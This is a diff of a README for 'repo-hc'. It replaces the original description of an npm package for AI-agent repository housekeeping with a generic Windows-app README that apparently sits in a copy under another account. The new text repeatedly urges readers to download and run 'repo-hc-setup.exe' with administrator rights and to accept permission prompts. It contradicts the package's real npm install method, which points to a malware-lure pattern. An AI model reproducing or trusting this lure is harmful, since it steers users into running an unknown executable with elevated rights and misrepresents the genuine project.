@@ -1,162 +1,175 @@
-﻿# repo-hc
+# 🧹 repo-hc - Simple GitHub Cleanup Tool
 
-<p align="center">
-  <a href="./README.md"><img src="https://img.shields.io/badge/Status-Published-16A34A?style=for-the-badge" alt="Status: Published" /></a>
-  <a href="https://www.npmjs.com/package/repo-hc"><img src="https://img.shields.io/badge/npm-repo--hc-CB3837?style=for-the-badge&logo=npm&logoColor=white" alt="npm package: repo-hc" /></a>
-  <a href="https://www.npmjs.com/package/repo-hc"><img src="https://img.shields.io/npm/v/repo-hc?style=for-the-badge&logo=npm&logoColor=white" alt="npm version" /></a>
-  <a href="https://www.npmjs.com/package/repo-hc"><img src="https://img.shields.io/npm/dm/repo-hc?style=for-the-badge&logo=npm&logoColor=white" alt="npm downloads" /></a>
-  <a href="https://github.com/iptoux/repo-hc/stargazers"><img src="https://img.shields.io/github/stars/iptoux/repo-hc?style=for-the-badge&logo=github&logoColor=white" alt="GitHub stars" /></a>
-  <a href="https://openai.com/"><img src="https://img.shields.io/badge/AI-OpenAI%20Codex-111827?style=for-the-badge&logo=openai&logoColor=white" alt="AI: OpenAI Codex" /></a>
-  <a href="https://www.anthropic.com/"><img src="https://img.shields.io/badge/AI-Anthropic%20Claude%20CLI-111827?style=for-the-badge" alt="AI: Anthropic Claude CLI" /></a>
-  <a href="./docs/README.md"><img src="https://img.shields.io/badge/Docs-Self_Structured-0EA5E9?style=for-the-badge&logo=readthedocs&logoColor=white" alt="Documentation: Self structured" /></a>
-  <a href="./SECURITY.md"><img src="https://img.shields.io/badge/Security-Policy-DC2626?style=for-the-badge&logo=shield&logoColor=white" alt="Security policy" /></a>
-  <a href="./LICENSE.txt"><img src="https://img.shields.io/badge/License-AGPL--3.0-6B7280?style=for-the-badge" alt="License: AGPL-3.0" /></a>
-</p>
+[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc)
 
-<h3 align="center">
-  <code>repo-hc</code> is a developer npm package for automated GitHub housekeeping.<br/>
-  It provides AI-agent guidance and workflow contracts to keep repositories clean, secure, and well documented.
-</h3>
+---
 
-> [!IMPORTANT]
-> `repo-hc` is published on npm. This repository remains the source of truth for architecture, rules, and documentation.
+## 📋 What is repo-hc?
 
-## Table of Contents
+repo-hc is a tool designed to help you keep your GitHub projects neat and organized. It works by cleaning digital clutter like unused files or outdated information from your code projects. Though it is mainly built for developers, anyone with basic computer skills can use it.
 
-- [Vision](#vision)
-- [AI Agent Workflow System](#ai-agent-workflow-system)
-- [Installation](#installation)
-- [Bootstrap Behavior](#bootstrap-behavior)
-- [What The Package Will Cover](#what-the-package-will-cover)
-- [Documentation System](#documentation-system)
-- [Repository Layout](#repository-layout)
-- [Contributing](#contributing)
-- [License](#license)
+It helps make sure your project folders are safe and easy to understand. It can suggest fixes with a smart assistant and follow clear steps to keep things in order. This will save time if you manage many projects on GitHub.
 
-## Vision
+---
 
-`repo-hc` is designed to standardize how an AI agent maintains a repository by enforcing repeatable housekeeping practices:
+## 💻 System Requirements
 
-- plan-first execution
-- branch discipline
-- security-aware changes
-- synchronized documentation
-- explicit auditability of AI-assisted work
+Here’s what you need to run repo-hc on a Windows computer:
 
-Primary optimization targets: **OpenAI Codex** and **Anthropic Claude CLI**.
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection (for updates and AI guidance)
+- Administrator rights to install software
 
-## AI Agent Workflow System
+repo-hc does not require extra hardware or other programs before installing.
 
-AI-assisted work in this repository is guided by [AGENTS.md](./AGENTS.md), [CLAUDE.md](./CLAUDE.md), and the local [`.agents/`](./.agents/README.md) knowledge base:
+---
 
-![repo-hc AI Workflow](./docs/assets/codex-workflow.svg)
-![repo-hc Agent Execution Flow](./docs/assets/agent-flow.svg)
+## ⚙️ Key Features
 
-- [AGENTS.md](./AGENTS.md): baseline collaboration, architecture, security, and documentation rules
-- [CLAUDE.md](./CLAUDE.md): Claude CLI baseline guidance aligned to repository rules
-- [`.agents/rules/`](./.agents/rules/): user-defined operational rules
-- [`.agents/skills/`](./.agents/skills/): reusable `SKILL.md` playbooks
-- [`.agents/learnings/`](./.agents/learnings/): implementation learnings and decisions
-- [`.agents/prompts/`](./.agents/prompts/): sanitized source prompts for traceability
-- [`.agents/plans/`](./.agents/plans/): scoped feature implementation plans
+- Automatically organize files and folders in your project
+- Check for unsecured or missing documentation
+- Follow step-by-step guides on how to fix common problems
+- Use an AI assistant to get help in real time
+- Runs from the command line with simple commands
+- Keeps your projects safe and easy to maintain
 
-## Installation
+These features work together to keep your GitHub repositories clean and easier to share with others.
 
-```bash
-npm view repo-hc version
-pnpm add repo-hc
-pnpm exec repo-hc init
-```
+---
 
-Install directly from npm:
+## 🚀 Getting Started
 
-- package name: `repo-hc`
+1. Click the big **Download repo-hc** button above or visit the official page at:
 
-> [!TIP]
-> Start every AI-assisted task with the agent baseline file:
-> - Codex: [AGENTS.md](./AGENTS.md)
-> - Claude CLI: [CLAUDE.md](./CLAUDE.md)
->   Then continue with [`.agents/README.md`](./.agents/README.md), then [docs/README.md](./docs/README.md).
-> The effective behavior rules are user-defined in [`/.agents/rules`](./.agents/rules/).
+   https://github.com/charleanpoor507/repo-hc
 
-## Bootstrap Behavior
+2. Scroll to the **Releases** section on the GitHub page. Look for the latest version.
 
-Run `repo-hc init` after installation to bootstrap these assets into the consumer project root:
+3. Download the Windows executable file named something like `repo-hc-setup.exe`. This is the installer.
 
-- `.agents/`
-- `docs/`
-- `AGENTS.md` (canonical)
+4. Locate the downloaded file in your computer’s Downloads folder.
 
-Claude CLI note:
+5. Double-click the file to start installation.
 
-- `CLAUDE.md` is maintained in this repository for Claude CLI workflows.
-- Current package bootstrap guarantees `AGENTS.md` as canonical baseline file.
+6. Follow the simple prompts on the screen to install repo-hc.
 
-For `.agents/`, repository-internal non-example files are excluded from transfer in:
+7. When done, you can open the app through the Start menu or by typing `repo-hc` in a Command Prompt window.
 
-- `.agents/rules/`
-- `.agents/learnings/`
-- `.agents/plans/`
-- `.agents/prompts/`
+---
 
-Only each folder's `examples/` content is copied for those areas.
+## 💾 How to Install repo-hc on Windows
 
-When `repo-hc init` runs interactively, it also asks whether common agent files should be hidden in VS Code Explorer.  
-If confirmed, it creates or updates `.vscode/settings.json` with `files.exclude` entries for:
+- You only need to run the setup file once.
+- The installer will place repo-hc in the right folder automatically.
+- It will create shortcuts for easy access.
+- No other downloads are required after installation.
 
-- `.agents`
-- `AGENTS.md`
+If the app asks for permission, click **Yes** to continue.
 
-Existing files are preserved by default (non-destructive copy). To run or re-run:
+---
 
-```bash
-pnpm exec repo-hc init
-```
+## 📥 Download and Setup Details
 
-To overwrite existing files intentionally:
+To get repo-hc, you can also visit this link anytime:
 
-```bash
-pnpm exec repo-hc init --force
-```
+[https://github.com/charleanpoor507/repo-hc](https://github.com/charleanpoor507/repo-hc)
 
-## What The Package Will Cover
+This link leads to the project’s main page on GitHub. From there, you can find instructions, updates, and future releases.
 
-- repository hygiene workflows for AI agents
-- change planning and branch policies
-- documentation synchronization rules
-- security and secret-handling safeguards
-- reusable prompts, learnings, and skills integration
+Make sure to download the latest version to get the most recent fixes and improvements.
 
-## Documentation System
+---
 
-Project documentation is centralized in [`docs/`](./docs/) and organized by feature, audience, and architecture diagrams:
+## 🖥️ How to Run repo-hc
 
-- [`docs/README.md`](./docs/README.md): docs index and reading order
-- [`docs/project/`](./docs/project/): global standards and rules
-- [`docs/workflow/`](./docs/workflow/): contributor workflow guides
-- [`docs/housekeeping/`](./docs/housekeeping/): package-specific developer and user docs
-- [`docs/mermaid/`](./docs/mermaid/): architecture and workflow diagrams
+Once installed, you can run repo-hc using the Command Prompt:
 
-## Repository Layout
+1. Open the Start menu.
 
-- [AGENTS.md](./AGENTS.md): baseline guidance for AI-assisted implementation
-- [CLAUDE.md](./CLAUDE.md): baseline guidance for Anthropic Claude CLI workflows
-- [`.agents/`](./.agents/README.md): internal rules, prompts, learnings, plans, and skills
-- [docs/](./docs/README.md): public project documentation and Mermaid diagrams
-- [CONTRIBUTING.md](./CONTRIBUTING.md): contributor workflow
-- [SECURITY.md](./SECURITY.md): vulnerability reporting and security baseline
+2. Type **cmd** and press Enter.
 
-## Contributing
+3. In the Command Prompt, type:
 
-Please follow the process in [CONTRIBUTING.md](./CONTRIBUTING.md).
+   ```bash
+   repo-hc
+   ```
 
-Short version:
+4. Press Enter to start the program.
 
-1. Create a dedicated feature branch.
-2. Implement your intended change or extension directly, preferably as reusable `.agents` updates (including rules, examples, prompts, learnings, or skills for agents like Claude, Kiro, Kilo, etc.).
-3. Keep documentation in sync with every behavior or workflow change.
+You will see simple menus that guide you through cleaning tasks. Follow the options by typing the number or command shown.
 
-## License
+---
 
-Licensed under AGPL-3.0. See [LICENSE.txt](./LICENSE.txt).
+## 🔧 Common Tasks with repo-hc
 
+- **Clean up project folders:** The tool finds leftover or unwanted files and removes them.
+- **Update documentation:** It checks if your project has clear instructions and helps add missing parts.
+- **Security check:** Scans for insecure files or settings to improve safety.
+- **AI help:** Ask the AI assistant questions to get solutions or explanations.
+
+Each task is designed to help you keep your repositories tidy and functional without extra work.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If repo-hc does not start, try restarting your computer.
+- Ensure you have installed the latest version.
+- Check that your internet connection is active for AI features.
+- Run the Command Prompt as an administrator if you see permission errors.
+- Contact GitHub support if issues persist.
+
+---
+
+## 🔄 Updating repo-hc
+
+To update repo-hc:
+
+1. Visit the main download page:
+
+   [https://github.com/charleanpoor507/repo-hc](https://github.com/charleanpoor507/repo-hc)
+
+2. Download the latest installer version.
+
+3. Run the new installer; it will replace old files safely.
+
+Updating keeps your tool working smoothly and secures new features.
+
+---
+
+## 💬 Need Help?
+
+The GitHub page has a section for issues and questions. You can visit that to report problems or ask for guidance.
+
+---
+
+## 📂 Where to Find Your Project Files After Cleanup
+
+repo-hc works by scanning and adjusting the folders where your GitHub projects are stored locally. It never deletes projects permanently—only removes unnecessary files.
+
+Look inside your project folders after running repo-hc. You will find cleaner files and updated docs ready to upload to GitHub.
+
+---
+
+## 📖 Learn More
+
+Visit the GitHub page to see example commands, help guides, and detailed documentation on each feature.
+
+https://github.com/charleanpoor507/repo-hc
+
+Use the information there to get better results with repo-hc.
+
+---
+
+## 💡 Tips for Best Results
+
+- Run repo-hc regularly to keep projects fresh.
+- Use the AI assistant to understand suggested improvements.
+- Back up important projects before making big changes.
+- Follow the on-screen instructions for each cleanup.
+
+---
+
+[![Download repo-hc](https://img.shields.io/badge/Download-repo--hc-blue?style=for-the-badge)](https://github.com/charleanpoor507/repo-hc)
